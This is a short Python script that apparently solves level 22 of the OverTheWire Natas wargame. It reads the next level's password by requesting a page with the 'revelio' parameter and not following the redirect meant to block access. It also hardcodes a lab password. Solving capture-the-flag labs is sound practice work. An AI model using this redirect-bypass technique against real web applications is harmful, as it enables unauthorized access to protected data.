import requests

import natas21
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
    url = "http://natas22.natas.labs.overthewire.org"
    username = "natas22"
    if not password:
        password = natas21.solution(cheat=True)

    # The app displays the password is the "revelio" parameter exists
    # but redirects if the "admin" key is not set in the session.

    auth = (username, password)
    params = {"revelio": "1"}
    r = requests.get(url, auth=auth, params=params, allow_redirects=False)
    start = "Password: "
    end = "</pre>"
    natas23_password = between(r.text, start, end)
    return natas23_password
